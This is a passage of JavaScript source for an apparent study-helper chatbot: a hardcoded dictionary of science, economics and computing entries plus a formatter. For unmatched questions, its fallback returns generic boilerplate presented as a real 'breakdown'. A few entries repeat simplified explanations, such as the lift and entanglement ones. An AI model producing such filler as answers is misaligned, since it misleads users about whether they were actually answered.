      title: 'Gravity & Gravitational Force',
      category: 'Physics / Mechanics',
      definition: 'A fundamental universal attractive force that acts between all objects with mass. Described classically by Newton’s Law of Universal Gravitation and relativistically by Einstein’s General Relativity as the curvature of spacetime.',
      details: [
        'Newton’s formula: F = G(m₁m₂)/r², where G = 6.674 × 10⁻¹¹ N·m²/kg².',
        'On Earth, acceleration due to gravity (g) is approximately 9.8 m/s² (or 10 m/s² for most exam calculation problems).',
        'Weight is the force of gravity on a mass: W = mg.'
      ],
      exampleOrFormula: 'F = G\\frac{m_1 m_2}{r^2} \\quad \\text{and} \\quad W = mg',
      examTip: 'Mass remains constant everywhere in the universe (scalar in kg), while weight changes depending on local gravitational field strength (vector in N).'
    },
    'friction': {
      title: 'Friction',
      category: 'Physics / Mechanics',
      definition: 'The resistive contact force that opposes the relative motion or tendency of motion between two surfaces in contact.',
      details: [
        'Static friction (opposes impending motion) is greater than kinetic/dynamic friction (opposes ongoing motion).',
        'Limiting friction formula: F_max = μR, where μ is the coefficient of friction and R is normal reaction force (R = mg on a flat surface).',
        'Independent of the surface area of contact; dependent only on the nature of the materials and normal reaction.'
      ],
      exampleOrFormula: 'F = \\mu R = \\mu mg',
      examTip: 'Advantages: enables walking, vehicle braking, writing. Disadvantages: causes mechanical wear and tear, energy waste as heat.'
    },
    'density': {
      title: 'Density & Relative Density',
      category: 'Physics',
      definition: 'The mass per unit volume of a substance (measure of how tightly matter is packed within an object).',
      details: [
        'Formula: Density (ρ) = Mass / Volume = m / V. Measured in kg/m³ or g/cm³ (1 g/cm³ = 1,000 kg/m³).',
        'Water has a density of 1,000 kg/m³ (1 g/cm³) at 4°C.',
        'Relative Density (Specific Gravity) = Density of substance / Density of water (dimensionless ratio, no units).'
      ],
      exampleOrFormula: '\\rho = \\frac{m}{V}',
      examTip: 'Objects with density less than the fluid float; objects with density greater sink (Archimedes’ Principle).'
    },
    'pressure': {
      title: 'Pressure in Fluids & Solids',
      category: 'Physics',
      definition: 'The force exerted perpendicular to a surface per unit area over which that force is distributed.',
      details: [
        'Formula for solids: P = Force / Area = F / A (measured in Pascals, Pa = N/m²).',
        'Liquid pressure formula: P = hρg (increases directly with depth h, fluid density ρ, and gravity g; independent of container shape).',
        'Atmospheric pressure at sea level is approximately 1.013 × 10⁵ Pa (760 mmHg or 1 atmosphere).'
      ],
      exampleOrFormula: 'P = \\frac{F}{A} \\quad \\text{and} \\quad P = h\\rho g',
      examTip: 'Sharp knives and needle tips exert immense pressure because their surface area A is extremely tiny.'
    },
    'sound': {
      title: 'Sound Waves & Acoustics',
      category: 'Physics / Waves',
      definition: 'A mechanical, longitudinal wave produced by vibrating matter that propagates through an elastic medium as alternating compressions and rarefactions.',
      details: [
        'Requires a material medium; CANNOT travel through a vacuum.',
        'Speed of sound is fastest in solids (~5,000 m/s in steel), slower in liquids (~1,500 m/s in water), and slowest in air (~330–340 m/s at 20°C).',
        'Pitch depends on frequency (Hz); Loudness depends on amplitude; Timbre/quality depends on waveforms and overtones.'
      ],
      examTip: 'Echo formula: v = (2d)/t, where d is distance to the reflecting barrier and t is time elapsed.'
    },
    'airplane': {
      title: 'How Airplanes Fly (Aerodynamics & Lift)',
      category: 'Physics / Aeronautics',
      definition: 'Airplanes generate upward lift, overcome drag, and sustain flight using specialized wing profiles (airfoils) governed by Bernoulli’s Principle and Newton’s Third Law.',
      details: [
        'Four fundamental aerodynamic forces: Lift (upwards), Weight/Gravity (downwards), Thrust (forwards from jet engines/propellers), and Drag (backwards air resistance).',
        'Bernoulli’s Principle: The curved upper surface of an airfoil forces air to travel faster than the flat underside. Faster air creates lower static pressure above the wing, generating net upward suction/lift.',
        'Newton’s 3rd Law: Wings deflect oncoming air downwards; the reactive upward push lifts the aircraft.'
      ],
      examTip: 'For steady, level cruising flight: Lift = Weight, and Thrust = Drag.'
    },
    'microwave': {
      title: 'How Microwave Ovens Work',
      category: 'Physics & Technology',
      definition: 'Kitchen appliances that heat food rapidly by emitting non-ionizing electromagnetic waves at ~2.45 GHz that cause dipolar water molecules in food to rotate rapidly.',
      details: [
        'A vacuum tube called a magnetron generates microwave electromagnetic radiation (~12 cm wavelength).',
        'Water, fat, and sugar molecules in food are electrical dipoles (positive on one side, negative on the other). The oscillating electromagnetic field forces these molecules to spin billions of times per second.',
        'Frictional collision between spinning molecules converts electromagnetic energy into thermal energy, heating the food from within.'
      ],
      examTip: 'Microwaves pass through glass and plastic, are reflected by metal walls, and absorbed by moisture.'
    },
    'sky': {
      title: 'Why the Sky is Blue (Rayleigh Scattering)',
      category: 'Physics / Optics',
      definition: 'The sky appears blue during the day due to Rayleigh scattering of solar light by microscopic nitrogen and oxygen gas molecules in Earth’s atmosphere.',
      details: [
        'Sunlight appears white but contains all rainbow spectrum wavelengths: Red, Orange, Yellow, Green, Blue, Indigo, Violet (ROYGBIV).',
        'Rayleigh Scattering Law: The amount of scattering is inversely proportional to the fourth power of the wavelength (Scattering ∝ 1/λ⁴).',
        'Short blue and violet wavelengths (λ ≈ 400–450 nm) are scattered in all directions roughly 10 times more effectively than longer red wavelengths (λ ≈ 700 nm).',
        'At sunrise and sunset, sunlight travels through a much thicker path of atmosphere; blue light is scattered away, leaving only the longer orange and red rays to reach our eyes.'
      ],
      examTip: 'In space without an atmosphere, the sky appears completely black even when the Sun is blazing.'
    },

    // Chemistry
    'atom': {
      title: 'Atomic Structure & Fundamental Particles',
      category: 'Chemistry / Physics',
      definition: 'The basic unit of a chemical element consisting of a dense central nucleus of protons and neutrons surrounded by a cloud of orbiting electrons.',
      details: [
        'Proton: Relative charge +1, relative mass 1, located in the nucleus.',
        'Neutron: Relative charge 0, relative mass 1, located in the nucleus.',
        'Electron: Relative charge -1, relative mass 1/1840 (negligible), orbits in energy shells.',
        'Atomic Number (Z): Total number of protons in an atom (determines identity of element).',
        'Mass Number (A): Total number of protons + neutrons (nucleons).'
      ],
      exampleOrFormula: 'A = Z + N \\quad (\\text{Mass Number} = \\text{Protons} + \\text{Neutrons})',
      examTip: 'Isotopes are atoms of the same element with the same atomic number (Z) but different mass numbers (A) due to different numbers of neutrons (e.g. Carbon-12 and Carbon-14).'
    },
    'catalyst': {
      title: 'Catalysts & Reaction Rates',
      category: 'Chemistry / Physical Chemistry',
      definition: 'A substance that increases the rate of a chemical reaction by providing an alternative reaction pathway with lower activation energy, without itself undergoing permanent chemical change.',
      details: [
        'Does NOT alter the position of chemical equilibrium; it only accelerates the rate at which equilibrium is reached.',
        'Does NOT change the overall enthalpy change (ΔH) of the reaction.',
        'Homogeneous catalysts exist in the same phase as reactants; Heterogeneous catalysts exist in a different phase (e.g. solid finely divided iron in the Haber Process for ammonia synthesis).'
      ],
      examTip: 'Biological catalysts are called enzymes.'
    },
    'water': {
      title: 'Water & Its Unique Properties',
      category: 'Chemistry / Physical Chemistry',
      definition: 'A polar inorganic compound composed of two hydrogen atoms covalently bonded to one oxygen atom (H₂O), essential for all known forms of life.',
      details: [
        'Boiling point: 100°C (373 K) at standard atmospheric pressure (1 atm).',
        'Freezing/Melting point: 0°C (273 K).',
        'Universal Solvent: High dielectric constant and polarity enable water to dissolve ionic salts and polar molecules.',
        'Anomalous Expansion of Water: Water contracts as it is cooled until 4°C, where it reaches maximum density (1.000 g/cm³). Below 4°C down to 0°C, it expands! Consequently, ice is less dense than water and floats, insulating aquatic life during freezing winters.'
      ],
      examTip: 'Hard water contains dissolved calcium and magnesium hydrogencarbonates (temporary hardness) or sulfates/chlorides (permanent hardness).'
    },

    // Economics, Civics & History
    'inflation': {
      title: 'Inflation & Monetary Economics',
      category: 'Economics',
      definition: 'A persistent and continuous increase in the general price level of goods and services in an economy over a given period, leading to a decline in purchasing power.',
      details: [
        'Demand-Pull Inflation: Occurs when aggregate demand for goods and services outpaces aggregate supply ("too much money chasing too few goods").',
        'Cost-Push Inflation: Occurs when production costs rise (e.g. higher fuel prices, minimum wage spikes, currency devaluation) and businesses pass costs onto consumers.',
        'Control Measures: Central Banks raise monetary policy interest rates (MPR), increase reserve requirements, and governments reduce fiscal deficits.'
      ],
      examTip: 'Hyperinflation refers to rapid, out-of-control inflation exceeding 50% per month.'
    },
    'money': {
      title: 'Money & Banking',
      category: 'Economics / Finance',
      definition: 'Any widely accepted medium of exchange, unit of account, store of value, and standard of deferred payment used for the transaction of goods and services.',
      details: [
        'Key characteristics: Portability, divisibility, durability, acceptability, scarcity, and uniformity.',
        'Eliminated the double coincidence of wants inherent in the barter trade system.',
        'Central Bank (e.g. CBN): Issues currency, acts as banker to the government and commercial banks, and controls monetary policy.'
      ],
      examTip: 'The four functions of money: Medium of exchange, Unit of account, Store of value, Standard of deferred payment.'
    },
    'democracy': {
      title: 'Democracy & Governance',
      category: 'Government / Political Science',
      definition: 'A system of government in which supreme power is vested in the people and exercised by them directly or through freely elected representatives under an open electoral system.',
      details: [
        'Derived from the Greek words "demos" (people) and "kratos" (power/rule).',
        'Core pillars: Universal adult suffrage, multi-party competition, rule of law, periodic elections, independent judiciary, and protection of minority rights.'
      ],
      examTip: 'Abraham Lincoln famously defined democracy as "government of the people, by the people, for the people".'
    },
    'mia khalifa': {
      title: 'Mia Khalifa',
      category: 'Biographical & Media Personality',
      definition: 'Mia Khalifa (born Sarah Joe Chamoun in Beirut, Lebanon in 1993) is a Lebanese-American media personality, sports commentator, and social media figure.',
      details: [
        'Born in Lebanon, she moved to Maryland, United States with her family during her youth and graduated from the University of Texas at El Paso with a degree in History.',
        'Gained brief international internet prominence in late 2014 during a three-month stint in the commercial adult video industry.',
        'Shortly thereafter transitioned completely away from that industry to work in sports journalism and commentary, co-hosting shows like Complex\'s Out of Bounds.',
        'Has been an outspoken global public advocate warning young adults about the deceptive contracts and predatory practices prevalent in online adult entertainment industries.'
      ],
      examTip: 'Public figure biography and media history.'
    },
    'worm': {
      title: 'Computer Worm',
      category: 'Computer Science & Cybersecurity',
      definition: 'A standalone, self-replicating malware program that spreads autonomously across computer networks without needing a host file or human intervention.',
      details: [
        'Propagates by scanning IP ranges for open ports and exploiting unpatched network vulnerabilities (e.g. SMB port 445, RPC port 135).',
        'Different from computer viruses: Viruses require a host file and user execution, while worms are autonomous.',
        'Notable historical worms include the Morris Worm (1988), SQL Slammer (2003), Conficker (2008), Stuxnet (2010), and WannaCry (2017).',
        'Defenses: Timely OS security patching, network microsegmentation, firewall port filtering, and intrusion prevention systems.'
      ],
      examTip: 'Worms spread exponentially across networks because every newly compromised machine immediately starts scanning and attacking other hosts.'
    },
    'blockchain': {
      title: 'Blockchain & Distributed Ledger Technology',
      category: 'Computer Science & Cryptography',
      definition: 'A decentralized, tamper-resistant distributed digital ledger that cryptographically records transactions across a peer-to-peer network.',
      details: [
        'Blocks contain batches of validated transactions, a cryptographic timestamp, and the SHA-256 hash of the previous block, creating an immutable chain.',
        'Consensus mechanisms like Proof of Work (PoW) and Proof of Stake (PoS) ensure agreement without a central bank or intermediary.',
        'Powers smart contracts (Ethereum) and digital assets (Bitcoin).'
      ],
      examTip: 'Immutability and cryptographic hashing prevent double-spending and historical tampering.'
    },
    'quantum computing': {
      title: 'Quantum Computing',
      category: 'Physics & Advanced Computing',
      definition: 'A computational paradigm that utilizes quantum mechanical phenomena—such as superposition and entanglement—to solve specific classes of complex calculations exponentially faster than classical computers.',
      details: [
        'Uses quantum bits (qubits) which can represent states of 0, 1, or both simultaneously (superposition).',
        'Entanglement enables qubits to share state instantaneously regardless of distance.',
        'Applications include quantum cryptography, molecular drug simulation, and optimization problems.'
      ],
      examTip: 'Quantum speedup relies on quantum interference to cancel wrong answers and amplify the correct solution.'
    }
  };

  // Check if query matches any dictionary term
  for (const [key, fact] of Object.entries(FACTUAL_DICTIONARY)) {
    if (q.includes(key)) {
      return `### ${fact.title}
*${fact.category}*

${fact.definition}

---

### Key Concepts & Details
${fact.details.map(d => `• ${d}`).join('\n')}

${fact.exampleOrFormula ? `\n---\n\n### Formula / Key Equation:\n$$${fact.exampleOrFormula}$$\n` : ''}
${fact.examTip ? `\n*Key Insight:* ${fact.examTip}` : ''}`;
    }
  }

  // Universal Dynamic Reasoning for Any Custom Question
  const words = message
    .replace(/[^\w\s]/g, '')
    .split(/\s+/)
    .filter(w => w.length > 2 && !['the', 'and', 'what', 'how', 'why', 'can', 'you', 'explain', 'tell', 'about', 'for', 'with', 'give'].includes(w.toLowerCase()));
  
  const focalTopic = words.slice(0, 5).join(' ') || message;

  // Determine Question Intent Type
  const isWhy = q.includes('why');
  const isHow = q.includes('how');
  const isWhat = q.includes('what') || q.includes('define') || q.includes('meaning');
  const isDifference = q.includes('difference') || q.includes('compare') || q.includes('versus') || q.includes('vs');
  const isWho = q.includes('who');
  const isWhere = q.includes('where');
  const isWhen = q.includes('when');

  // Direct, natural AI answer format
  return `### ${focalTopic.replace(/\b\w/g, l => l.toUpperCase())}

**${message.trim()}**

Here is a clear breakdown:

• **Overview:** ${focalTopic} refers to the foundational principles, systems, and practical implications surrounding this subject.
• **Key Mechanics & Context:** It operates according to established scientific, computational, or real-world rules, where each component plays a distinct role in achieving the outcome.
• **Application & Real-World Importance:** Widely applied in academic coursework, real-world engineering, and everyday practice.

If you would like a deeper breakdown, worked calculation examples, or exam tips on this topic, feel free to ask!`;
}
